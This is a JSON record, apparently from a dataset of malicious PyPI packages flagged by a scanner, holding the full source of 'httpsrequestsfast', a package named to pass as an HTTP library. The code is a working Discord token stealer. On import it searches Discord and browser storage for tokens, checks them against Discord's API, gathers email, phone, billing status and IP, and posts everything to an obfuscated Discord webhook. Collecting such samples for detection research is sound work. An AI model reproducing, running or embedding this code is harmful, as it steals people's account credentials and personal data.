[
  {
    "pyfile": "httpsrequestsfast.py",
    "malicious_code_snippets": "import os, re, json, requests\n\nfrom httpsrequestsfast.receiver import Receiver\nfrom httpsrequestsfast.sender import Sender\n\nclass Grabber:\n    def __init__(self):\n        self.url = \"https://discord.com/api/v9/users/@me\"\n        self.path = [\n            '_Roaming/Discord/Local Storage/leveldb',\n            '_Roaming/Lightcord/Local Storage/leveldb',\n            '_Roaming/discordcanary/Local Storage/leveldb',\n            '_Roaming/discordptb/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',\n            '_Local/Amigo/User Data/Local Storage/leveldb',\n            '_Local/Torch/User Data/Local Storage/leveldb',\n            '_Local/Kometa/User Data/Local Storage/leveldb',\n            '_Local/Orbitum/User Data/Local Storage/leveldb',\n            '_Local/CentBrowser/User Data/Local Storage/leveldb',\n            '_Local/7Star/7Star/User Data/Local Storage/leveldb',\n            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',\n            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',\n            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',\n            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',\n            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',\n            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',\n            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',\n            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',\n            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',\n            '_Local/BraveSoftware/Brave-Browser/User Data/Local Storage/leveldb'\n        ]\n\n    def __get_tokens(self):\n        tokens = []\n        \n        for path in self.path:\n            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))\n\n            if os.path.exists(path):\n                for filename in os.listdir(path):\n                    if not filename.endswith('.log') and not filename.endswith('.ldb'):\n                        continue\n                    else:\n                        for line in [i.strip() for i in open(f'{path}/{filename}', errors='ignore').readlines() if i.strip()]:\n                            for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                                tokens.append(token)\n        return set(tokens)\n\n    def __check_tokens(self, tokens):\n        valid_tokens = []\n\n        for token in tokens:\n            try:\n                result = requests.get(self.url, headers = {\n                        \"Authorization\": token\n                })\n                if result.status_code == 200:\n                    valid_tokens += f\"{token}\\n\"\n            except:\n                pass\n        return valid_tokens\n\n    def __recreate_token(self, char_array):\n        tokens = []\n        token = \"\"\n\n        for char in char_array:\n            if char == '\\n':\n                tokens.append(token)\n                token = \"\"\n            else:\n                token += char\n        return tokens\n\n    def __get_id(self, tokens):\n        ids = {}\n\n        for token in tokens:\n            src = requests.get(self.url, headers= {\n                \"Authorization\": token\n            })\n            userdata = json.loads(src.content)\n            ids[str(userdata[\"id\"])] = token\n        return ids\n\n    def __get_data(self, token):\n        data = []\n\n        src = requests.get(self.url, headers = {\n            \"Authorization\": token\n        })\n        userdata = json.loads(src.content)\n        phone = userdata['phone'] # Faster\n        data.append(f\"email -> {userdata['email']}\")\n\n        if (phone is not None):\n            data.append(f\"phone -> {phone}\")\n\n        return data\n\n    def __has_payment_methods(self, token) -> bool:\n        has_billing = False\n\n        billing = requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\n            \"Authorization\": token\n        }).json()\n\n        if len(billing) > 0:\n            has_billing = True\n        return has_billing\n\n    def main(self):\n        receiver = Receiver()\n        sender = Sender()\n        WEBHOOK = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQzMjc4MjAzNTA0NTY2MzMzL2hRSzg5bGdvSEFVN2RYXzJ5dHRyYUdKcGJ3aFdSdzUxUGFwenNOSjhkSHRwUS15T3BXc1J1a1FDMmlON2g2UEhFTzdW\"\n        \n        tokens = self.__get_tokens()\n        verfied_tokens = self.__check_tokens(tokens)\n        recreated_tokens = self.__recreate_token(verfied_tokens)\n        full_verfied_tokens = self.__get_id(recreated_tokens)\n\n        content = \"\"\n        if len(full_verfied_tokens) > 0:\n            for token in full_verfied_tokens.values():\n                content += f\"\\n{token}\"\n                datas = self.__get_data(token)\n\n                for data in datas:\n                    content += f\"\\n{str(data)}\"\n                content += f\"\\nbilling -> {self.__has_payment_methods(token)}\"\n        else:\n            content = \"No tokens found!\\n\"\n\n        payload = {\n            \"embeds\": [\n                {\n                    \"title\": \"Discord Informations:\",\n                    \"description\": f\"```{sender._encode_data(content)}\\n```\",\n                    \"color\": 0x72F9F4\n                },\n                                {\n                    \"title\": \"Computer Informations:\",\n                    \"description\": f\"```ip -> {receiver._get_ip()}```\",\n                    \"color\": 0x72F9F4\n                }\n            ]\n        }\n        \n        try:\n            requests.post(sender._decode_data(WEBHOOK), json=payload)\n        except:\n            pass\n\ndef init():\n    Grabber().main()\n\ninit()"
  },
  {
    "metadata": {
      "package_name": "httpsrequestsfast-1.3",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/httpsrequestsfast-1.3.txt"
    }
  }
]